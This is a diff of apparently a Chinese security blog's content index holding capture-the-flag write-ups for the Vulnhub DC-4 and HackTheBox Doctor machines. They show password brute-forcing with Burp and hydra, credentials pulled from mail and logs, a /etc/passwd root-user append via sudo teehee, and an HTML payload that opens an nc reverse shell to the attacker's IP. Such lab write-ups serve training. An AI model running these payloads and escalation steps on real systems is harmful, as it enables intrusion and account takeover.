+<h2 id="0x04-使用bp爆破"><a href="#0x04-使用bp爆破" class="headerlink" title="0x04.使用bp爆破"></a>0x04.使用bp爆破</h2><h3 id="1-抓包"><a href="#1-抓包" class="headerlink" title="1.抓包"></a>1.抓包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.3</span><br><span class="line">Content-Length: 29</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.1.3</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.1.3/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: has_js=1; SESS3d56985a7fb178e8eb469ddb59bb6550=6flnn9PeYpt0eXlfkyxJlP9vjJwA3UhQ4nszAdkawro; Drupal.toolbar.collapsed=0; PHPSESSID=cdfml2498srtgu1effus59caj4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=admin</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-爆破密码"><a href="#2-爆破密码" class="headerlink" title="2.爆破密码"></a>2.爆破密码</h3><img src="/2020/08/23/DC-4/image-20200823100752772.png" class>
+
+<p><code>添加字典</code></p>
+<blockquote>
+<p>字典为：</p>
+<p>/usr/share/john/password.lst</p>
+</blockquote>
+<img src="/2020/08/23/DC-4/image-20200823100842693.png" class>
+
+<p><code>添加线程数</code></p>
+<img src="/2020/08/23/DC-4/image-20200823100909253.png" class>
+
+<p><code>爆破，得到admin密码</code></p>
+<img src="/2020/08/23/DC-4/image-20200823101419431.png" class>
+
+<h2 id="0x05-登入"><a href="#0x05-登入" class="headerlink" title="0x05.登入"></a>0x05.登入</h2><p><code>发现两个按钮</code></p>
+<img src="/2020/08/23/DC-4/image-20200823101705004.png" class>
+
+<p><code>点击，查看</code></p>
+<img src="/2020/08/23/DC-4/image-20200823101759883.png" class>
+
+<img src="/2020/08/23/DC-4/image-20200823101819698.png" class>
+
+<img src="/2020/08/23/DC-4/image-20200823101834283.png" class>
+
+<h2 id="0x06-继续抓包，查看命令是如何执行的"><a href="#0x06-继续抓包，查看命令是如何执行的" class="headerlink" title="0x06.继续抓包，查看命令是如何执行的"></a>0x06.继续抓包，查看命令是如何执行的</h2><img src="/2020/08/23/DC-4/image-20200823102447148.png" class>
+
+<p><code>更换其他系统命令，可以执行，判断存在命令注入漏洞，并发现了几个用户</code></p>
+<img src="/2020/08/23/DC-4/image-20200823102752407.png" class>
+
+<p><code>查看home目录</code></p>
+<img src="/2020/08/23/DC-4/image-20200823103524956.png" class>
+
+<p><code>每个家目录都查看一下，发现一个old-passwords.bak</code></p>
+<img src="/2020/08/23/DC-4/image-20200823103748208.png" class>
+
+<p><code>将用户与密码编辑为字典用于爆破</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># ls</span></span><br><span class="line">nmap.A  nmap.sP  old-passwords.bak  users.bak</span><br><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-ssh爆破"><a href="#0x07-ssh爆破" class="headerlink" title="0x07.ssh爆破"></a>0x07.ssh爆破</h2><p><code>由于开放了ssh端口，可以进行ssh爆破</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># hydra -L users.bak -P old-passwords.bak ssh://192.168.1.3 -vV -f -o hydra.ssh</span></span><br></pre></td></tr></table></figure>
+
+<p><code>爆破成功一个用户</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># cat hydra.ssh </span></span><br><span class="line"><span class="comment"># Hydra v9.1 run at 2020-08-22 22:49:20 on 192.168.1.3 ssh (hydra -L users.bak -P old-passwords.bak -vV -f -o hydra.ssh ssh://192.168.1.3)</span></span><br><span class="line">[22][ssh] host: 192.168.1.3   login: jim   password: jibril04</span><br><span class="line">root@JIYE:~/tmp/DC4<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-ssh登入"><a href="#0x08-ssh登入" class="headerlink" title="0x08.ssh登入"></a>0x08.ssh登入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC4<span class="comment"># ssh jim@192.168.1.3</span></span><br><span class="line">jim@192.168.1.3<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">You have mail.</span></span><br><span class="line"><span class="string">Last login: Sun Aug 23 13:35:56 2020 from 192.168.1.6</span></span><br><span class="line"><span class="string">jim@dc-4:~$ whoami</span></span><br><span class="line"><span class="string">jim</span></span><br><span class="line"><span class="string">jim@dc-4:~$ </span></span><br></pre></td></tr></table></figure>
+
+<p><code>检查文件，发现一封来自root的邮件</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@dc-4:~$ ls -l</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups</span><br><span class="line">-rw------- 1 jim jim  528 Apr  6  2019 mbox</span><br><span class="line">-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh</span><br><span class="line">jim@dc-4:~$ cat mbox </span><br><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        <span class="keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a <span class="built_in">test</span>.</span><br></pre></td></tr></table></figure>
+
+<p><code>根据思路查看还有没有其他邮件，结果得到charles的密码</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@dc-4:~$ <span class="built_in">cd</span> /var/mail/</span><br><span class="line">jim@dc-4:/var/mail$ ls -l</span><br><span class="line">total 4</span><br><span class="line">-rw-rw---- 1 jim mail 715 Apr  6  2019 jim</span><br><span class="line">jim@dc-4:/var/mail$ </span><br><span class="line">jim@dc-4:/var/mail$ </span><br><span class="line">jim@dc-4:/var/mail$ cat jim </span><br><span class="line">From charles@dc-4 Sat Apr 06 21:15:46 2019</span><br><span class="line">Return-path: &lt;charles@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000</span><br><span class="line">Received: from charles by dc-4 with <span class="built_in">local</span> (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;charles@dc-4&gt;)</span><br><span class="line">        id 1hCjIX-0000kO-Qt</span><br><span class="line">        <span class="keyword">for</span> jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Holidays</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;</span><br><span class="line">From: Charles &lt;charles@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 21:15:45 +1000</span><br><span class="line">Status: O</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I<span class="string">&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password is:  ^xHhA&amp;hvim0y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">See ya,</span></span><br><span class="line"><span class="string">Charles</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-提权"><a href="#0x09-提权" class="headerlink" title="0x09.提权"></a>0x09.提权</h2><h3 id="1-使用sudo-l"><a href="#1-使用sudo-l" class="headerlink" title="1.使用sudo -l"></a>1.使用sudo -l</h3><p><code>jim用户不能使用sudo -l</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@dc-4:~$ sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the <span class="built_in">local</span> System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) Respect the privacy of others.</span></span><br><span class="line">    <span class="comment">#2) Think before you type.</span></span><br><span class="line">    <span class="comment">#3) With great power comes great responsibility.</span></span><br><span class="line"></span><br><span class="line">[sudo] password <span class="keyword">for</span> jim: </span><br><span class="line">Sorry, user jim may not run sudo on dc-4.</span><br><span class="line">jim@dc-4:~$</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-切换charles用户"><a href="#2-切换charles用户" class="headerlink" title="2.切换charles用户"></a>2.切换charles用户</h3><p><code>发现可以使用teehee命令提权</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># ssh charles@192.168.1.3</span></span><br><span class="line">charles@192.168.1.3<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The programs included with the Debian GNU/Linux system are free software;</span></span><br><span class="line"><span class="string">the exact distribution terms for each program are described in the</span></span><br><span class="line"><span class="string">individual files in /usr/share/doc/*/copyright.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="string">permitted by applicable law.</span></span><br><span class="line"><span class="string">charles@dc-4:~$ sudo -l</span></span><br><span class="line"><span class="string">Matching Defaults entries for charles on dc-4:</span></span><br><span class="line"><span class="string">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">User charles may run the following commands on dc-4:</span></span><br><span class="line"><span class="string">    (root) NOPASSWD: /usr/bin/teehee</span></span><br><span class="line"><span class="string">charles@dc-4:~$</span></span><br></pre></td></tr></table></figure>
+
+<p><code>查看teehee参数，发现-a参数为追加文件且不覆盖</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles@dc-4:~$ teehee --<span class="built_in">help</span></span><br><span class="line">Usage: teehee [OPTION]... [FILE]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, <span class="keyword">do</span> not overwrite</span><br><span class="line">  -i, --ignore-interrupts   ignore interrupt signals</span><br><span class="line">  -p                        diagnose errors writing to non pipes</span><br><span class="line">      --output-error[=MODE]   <span class="built_in">set</span> behavior on write error.  See MODE below</span><br><span class="line">      --<span class="built_in">help</span>     display this <span class="built_in">help</span> and <span class="built_in">exit</span></span><br><span class="line">      --version  output version information and <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">MODE determines behavior with write errors on the outputs:</span><br><span class="line">  <span class="string">&#x27;warn&#x27;</span>         diagnose errors writing to any output</span><br><span class="line">  <span class="string">&#x27;warn-nopipe&#x27;</span>  diagnose errors writing to any output not a pipe</span><br><span class="line">  <span class="string">&#x27;exit&#x27;</span>         <span class="built_in">exit</span> on error writing to any output</span><br><span class="line">  <span class="string">&#x27;exit-nopipe&#x27;</span>  <span class="built_in">exit</span> on error writing to any output not a pipe</span><br><span class="line">The default MODE <span class="keyword">for</span> the -p option is <span class="string">&#x27;warn-nopipe&#x27;</span>.</span><br><span class="line">The default operation when --output-error is not specified, is to</span><br><span class="line"><span class="built_in">exit</span> immediately on error writing to a pipe, and diagnose errors</span><br><span class="line">writing to non pipe outputs.</span><br><span class="line"></span><br><span class="line">GNU coreutils online <span class="built_in">help</span>: &lt;http://www.gnu.org/software/coreutils/&gt;</span><br><span class="line">Full documentation at: &lt;http://www.gnu.org/software/coreutils/tee&gt;</span><br><span class="line">or available locally via: info <span class="string">&#x27;(coreutils) tee invocation&#x27;</span></span><br><span class="line">charles@dc-4:~$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="3-teehee提权"><a href="#3-teehee提权" class="headerlink" title="3.teehee提权"></a>3.teehee提权</h3><p><code>向/etc/passwd追加文件</code></p>
+<blockquote>
+<p>/etc/passwd文件一共有7个字段</p>
+<p>第一个字段代表用户名；</p>
+<p>第二个字段代表是否有密码保护；</p>
+<p>第三个字段表示UID，为0表示root用户；</p>
+<p>第四个字段表示GID；</p>
+<p>第五个字段表示用户全称；</p>
+<p>第六个字段表示用户家目录；</p>
+<p>第七个字段表示用什么shell来解析执行</p>
+</blockquote>
+<p><code>为root用户添加别名</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles@dc-4:~$ <span class="built_in">echo</span> <span class="string">&quot;fjy::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd</span><br><span class="line">fjy::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">_apt:x:104:65534::/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:105:109::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">nginx:x:107:111:nginx user,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash</span><br><span class="line">jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash</span><br><span class="line">sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</span><br><span class="line">Debian-exim:x:108:112::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">fjy::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:~$ </span><br></pre></td></tr></table></figure>
+
+<p><code>登入</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">charles@dc-4:~$ su fjy</span><br><span class="line">root@dc-4:/home/charles<span class="comment"># cd</span></span><br><span class="line">root@dc-4:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@dc-4:/root<span class="comment"># cat flag.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  <span class="string">&quot;Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;</span><span class="string">&quot;88b 888 &quot;</span>88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      <span class="string">&quot;   &quot;</span>   <span class="string">&quot;   &quot;</span>  </span><br><span class="line">888P     Y888  <span class="string">&quot;Y8888  888 888      8888888P&quot;</span>   <span class="string">&quot;Y88P&quot;</span>  888  888  <span class="string">&quot;Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span></span><br><span class="line"><span class="string">who have provided feedback, and who have taken time to complete these little</span></span><br><span class="line"><span class="string">challenges.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span></span><br><span class="line"><span class="string">root@dc-4:/root# </span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>vulnhub</category>
+        <category>DC</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-[Emdee_five_for_life]</title>
     <url>/2020/09/18/Emdee-five-for-life/</url>
     <content><![CDATA[<h2 id="Emdee-five-for-life"><a href="#Emdee-five-for-life" class="headerlink" title="Emdee five for life"></a><span class="exturl" data-url="aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5ldS9jaGFsbGVuZ2VzLzY3">Emdee five for life<i class="fa fa-external-link-alt"></i></span></h2><a id="more"></a>
@@ -253,6 +253,202 @@
 
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;</span><br></pre></td></tr></table></figure>
 
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTB-doctor</title>
+    <url>/2020/10/18/HTB-doctor/</url>
+    <content><![CDATA[<h2 id="0x00简述"><a href="#0x00简述" class="headerlink" title="0x00简述"></a>0x00简述</h2><img src="/2020/10/18/HTB-doctor/image-20201018151933161.png" class>
+
+<a id="more"></a>
+
+<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>可以看到开放了22/80/8089端口，8089对应的服务为splunk</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nmap -sC -sV -sT 10.10.10.209 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-18 03:21 EDT</span><br><span class="line">Nmap scan report for 10.10.10.209</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Doctor</span><br><span class="line">8089/tcp open  ssl/http Splunkd httpd</span><br><span class="line">| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser</span><br><span class="line">| Not valid before: 2020-09-06T15:57:27</span><br><span class="line">|_Not valid after:  2023-09-06T15:57:27</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 103.68 seconds</span><br><span class="line">root@JIYE:~/htb/doctor#</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-先访问80端口"><a href="#0x02-先访问80端口" class="headerlink" title="0x02.先访问80端口"></a>0x02.先访问80端口</h2><p><code>同样的配方同样的味道，添加一条hosts  [doctors.htb    10.10.10.209]</code></p>
+<img src="/2020/10/18/HTB-doctor/image-20201018152818636.png" class>
+
+<h2 id="0x03-访问doctors-htb"><a href="#0x03-访问doctors-htb" class="headerlink" title="0x03.访问doctors.htb"></a>0x03.访问doctors.htb</h2><h3 id="1-尝试简单注入，可是没有。"><a href="#1-尝试简单注入，可是没有。" class="headerlink" title="1.尝试简单注入，可是没有。"></a>1.尝试简单注入，可是没有。</h3><img src="/2020/10/18/HTB-doctor/image-20201018154218860.png" class>
+
+<h3 id="2-注册用户"><a href="#2-注册用户" class="headerlink" title="2.注册用户"></a>2.注册用户</h3><img src="/2020/10/18/HTB-doctor/image-20201018154351730.png" class>
+
+<h3 id="3-登入"><a href="#3-登入" class="headerlink" title="3.登入"></a>3.登入</h3><img src="/2020/10/18/HTB-doctor/image-20201018154434150.png" class>
+
+<h3 id="4-手动爬虫"><a href="#4-手动爬虫" class="headerlink" title="4.手动爬虫"></a>4.手动爬虫</h3><p><code>发现而已提交留言，感觉到存储型XSS的味道。。。</code></p>
+<img src="/2020/10/18/HTB-doctor/image-20201018154824325.png" class>
+
+<h3 id="5-构建XSS代码反弹shell"><a href="#5-构建XSS代码反弹shell" class="headerlink" title="5.构建XSS代码反弹shell"></a>5.构建XSS代码反弹shell</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://10.10.17.216/$(nc.traditional$IFS-e$IFS/bin/bash$IFS</span>&#x27;<span class="attr">10.10.17.216</span>&#x27;$<span class="attr">IFS</span>&#x27;<span class="attr">6666</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>kali先监听6666</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>提交</code></p>
+<img src="/2020/10/18/HTB-doctor/image-20201018155733291.png" class>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.209] 38714</span><br><span class="line">whoami</span><br><span class="line">web</span><br><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">web@doctor:~$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="6-升级shell"><a href="#6-升级shell" class="headerlink" title="6.升级shell"></a>6.升级shell</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">web@doctor:~$ ^Z</span><br><span class="line">[1]+  已停止               nc -nvlp 6666</span><br><span class="line">root@JIYE:~/htb/doctor# stty raw -echo</span><br><span class="line">root@JIYE:~/htb/doctor# nc -nvlp 6666</span><br><span class="line"></span><br><span class="line">web@doctor:~$ </span><br><span class="line">web@doctor:~$ pwd</span><br><span class="line">/home/web</span><br><span class="line">web@doctor:~$</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-登入到shaun用户"><a href="#0x04-登入到shaun用户" class="headerlink" title="0x04.登入到shaun用户"></a>0x04.登入到shaun用户</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">web@doctor:~$ cd /home/</span><br><span class="line">web@doctor:/home$ ls</span><br><span class="line">shaun  web</span><br><span class="line">web@doctor:/home$ cd shaun/</span><br><span class="line">web@doctor:/home/shaun$ ls</span><br><span class="line">user.txt</span><br><span class="line">web@doctor:/home/shaun$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">web@doctor:/home/shaun$</span><br></pre></td></tr></table></figure>
+
+<p><code>爬取文件</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">web@doctor:~/blog$ cd /var/www/html/ </span><br><span class="line">web@doctor:/var/www/html$ ls</span><br><span class="line">about.html  contact.html  departments.html  images      js</span><br><span class="line">blog.html   css           fonts             index.html  services.html</span><br><span class="line">web@doctor:/var/www/html$ cd /var/lo</span><br><span class="line">local/ lock/  log/   </span><br><span class="line">web@doctor:/var/www/html$ cd /var/log/apache2/</span><br><span class="line">web@doctor:/var/log/apache2$ ls</span><br><span class="line">access.log        access.log.5.gz  error.log.10.gz  error.log.5.gz</span><br><span class="line">access.log.1      access.log.6.gz  error.log.11.gz  error.log.6.gz</span><br><span class="line">access.log.10.gz  access.log.7.gz  error.log.12.gz  error.log.7.gz</span><br><span class="line">access.log.11.gz  access.log.8.gz  error.log.13.gz  error.log.8.gz</span><br><span class="line">access.log.12.gz  access.log.9.gz  error.log.14.gz  error.log.9.gz</span><br><span class="line">access.log.2.gz   backup           error.log.2.gz   other_vhosts_access.log</span><br><span class="line">access.log.3.gz   error.log        error.log.3.gz</span><br><span class="line">access.log.4.gz   error.log.1      error.log.4.gz</span><br><span class="line">web@doctor:/var/log/apache2$ cat backup </span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;\x16\x03&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;t3 12.1.2\n&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;PROPFIND / HTTP/1.1&quot; 405 521 &quot;-&quot; &quot;Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)&quot;</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:09:48 +0200] &quot;GET /.git/HEAD HTTP/1.1&quot; 404 453 &quot;-&quot; </span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">省略一大堆。。。</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">web@doctor:/var/log/apache2$ cat backup | grep pass</span><br><span class="line">10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &quot;POST /reset_password?email=Guitar123&quot; 500 453 &quot;http://doctor.htb/reset_password&quot;</span><br><span class="line">web@doctor:/var/log/apache2$ </span><br></pre></td></tr></table></figure>
+
+<p><code>得到shaun密码[Guitar123]，登入</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">web@doctor:/var/log/apache2$ su shaun</span><br><span class="line">Password: </span><br><span class="line">shaun@doctor:/var/log/apache2$ whoami</span><br><span class="line">shaun</span><br><span class="line">shaun@doctor:/var/log/apache2$ </span><br><span class="line">shaun@doctor:/var/log/apache2$ cd</span><br><span class="line">shaun@doctor:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">shaun@doctor:~$ cat user.txt </span><br><span class="line">**************************************</span><br><span class="line">shaun@doctor:~$</span><br></pre></td></tr></table></figure>
+
